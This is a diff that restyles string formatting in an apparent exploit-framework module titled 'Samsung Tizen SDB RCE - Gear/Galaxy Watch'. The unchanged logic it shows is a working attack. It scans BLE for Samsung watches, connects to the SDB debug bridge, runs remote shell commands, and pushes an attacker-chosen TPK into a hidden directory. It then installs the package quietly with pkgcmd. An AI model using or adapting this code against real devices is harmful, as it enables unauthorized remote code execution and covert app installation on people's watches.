@@ -138,8 +138,8 @@ class Exploit(Exploit):
                     sock.recv(min(data_len, 8192))
                 return sock
             sock.close()
-        except (OSError, socket.error) as exc:
-            print_error("SDB connection failed: {}".format(exc))
+        except OSError as exc:
+            print_error(f"SDB connection failed: {exc}")
         return None
 
     def _sdb_push_file(self, sock, local_path, remote_path):
@@ -154,7 +154,7 @@ class Exploit(Exploit):
             True if the push completed.
         """
         if not os.path.isfile(local_path):
-            print_error("TPK file not found: {}".format(local_path))
+            print_error(f"TPK file not found: {local_path}")
             return False
 
         file_size = os.path.getsize(local_path)
@@ -162,7 +162,7 @@ class Exploit(Exploit):
             print_error("TPK exceeds 50 MB limit")
             return False
 
-        service = "sync:\x00".encode("utf-8")
+        service = b"sync:\x00"
         header = self._sdb_make_header(
             self._SDB_OPEN, 1, 0, len(service)
         )
@@ -175,7 +175,7 @@ class Exploit(Exploit):
 
         remote_id = struct.unpack_from("<I", resp, 4)[0]
 
-        send_cmd = "SEND:{},{}\x00".format(remote_path, 0o644).encode("utf-8")
+        send_cmd = f"SEND:{remote_path},{0o644}\x00".encode()
         header = self._sdb_make_header(
             self._SDB_WRTE, 1, remote_id, len(send_cmd)
         )
@@ -225,7 +225,7 @@ class Exploit(Exploit):
         Returns:
             Command output string or empty string.
         """
-        service = "shell:{}\x00".format(command).encode("utf-8")
+        service = f"shell:{command}\x00".encode()
         header = self._sdb_make_header(self._SDB_OPEN, 2, 0, len(service))
         sock.sendall(header + service)
 
@@ -281,7 +281,7 @@ class Exploit(Exploit):
             sock.send(disable)
             sock.close()
         except (OSError, PermissionError) as exc:
-            print_error("BLE scan error: {}".format(exc))
+            print_error(f"BLE scan error: {exc}")
         return list(devices.values())
 
     def _parse_samsung_adv(self, pkt):
@@ -297,7 +297,7 @@ class Exploit(Exploit):
             return None
         try:
             addr_bytes = pkt[7:13] if len(pkt) > 13 else pkt[3:9]
-            bdaddr = ":".join("{:02X}".format(b) for b in reversed(addr_bytes))
+            bdaddr = ":".join(f"{b:02X}" for b in reversed(addr_bytes))
             name = ""
             is_samsung = False
 
@@ -340,16 +340,14 @@ class Exploit(Exploit):
             sock.connect((self.target_ip, int(self.sdb_port)))
             sock.close()
             return True
-        except (OSError, socket.error):
+        except OSError:
             return False
 
     @multi
     def run(self):
         """Execute Samsung Tizen RCE via SDB debug bridge."""
         print_status("Samsung Tizen SDB RCE - Gear/Galaxy Watch")
-        print_info("Adapter: {} | SDB port: {}".format(
-            self.adapter, self.sdb_port
-        ))
+        print_info(f"Adapter: {self.adapter} | SDB port: {self.sdb_port}")
 
         if self.target_bdaddr or not self.target_ip:
             print_status("Scanning BLE for Samsung watches...")
@@ -366,9 +364,7 @@ class Exploit(Exploit):
             print_error("target_ip required for SDB connection")
             return
 
-        print_status("Connecting to SDB on {}:{}...".format(
-            self.target_ip, self.sdb_port
-        ))
+        print_status(f"Connecting to SDB on {self.target_ip}:{self.sdb_port}...")
         sock = self._sdb_connect(self.target_ip, self.sdb_port)
         if not sock:
             print_error("SDB connection failed (debug mode may be disabled)")
@@ -384,7 +380,7 @@ class Exploit(Exploit):
         ]:
             output = self._sdb_shell(sock, cmd)
             if output:
-                print_info("  {}: {}".format(label, output[:120]))
+                print_info(f"  {label}: {output[:120]}")
 
         if not self.tpk_path:
             print_warning("No TPK payload specified (tpk_path is empty)")
@@ -393,29 +389,29 @@ class Exploit(Exploit):
             return
 
         if not os.path.isfile(str(self.tpk_path)):
-            print_error("TPK not found: {}".format(self.tpk_path))
+            print_error(f"TPK not found: {self.tpk_path}")
             sock.close()
             return
 
         tpk_name = os.path.basename(str(self.tpk_path))
-        remote_path = "/opt/usr/apps/.tmp/{}".format(tpk_name)
+        remote_path = f"/opt/usr/apps/.tmp/{tpk_name}"
         tpk_hash = hashlib.sha256(
             open(str(self.tpk_path), "rb").read()
         ).hexdigest()[:16]
 
-        print_status("Pushing TPK: {} (SHA256: {}...)".format(tpk_name, tpk_hash))
+        print_status(f"Pushing TPK: {tpk_name} (SHA256: {tpk_hash}...)")
         if self._sdb_push_file(sock, str(self.tpk_path), remote_path):
-            print_success("TPK uploaded to {}".format(remote_path))
+            print_success(f"TPK uploaded to {remote_path}")
         else:
             print_error("TPK upload failed")
             sock.close()
             return
 
-        install_cmd = "pkgcmd -i -t tpk -p {} -q".format(remote_path)
+        install_cmd = f"pkgcmd -i -t tpk -p {remote_path} -q"
         print_status("Installing TPK on device...")
         output = self._sdb_shell(sock, install_cmd)
         if output:
-            print_info("Install output: {}".format(output[:200]))
+            print_info(f"Install output: {output[:200]}")
 
         if "success" in output.lower() or "ok" in output.lower():
             print_success("TPK installed and running on the watch")
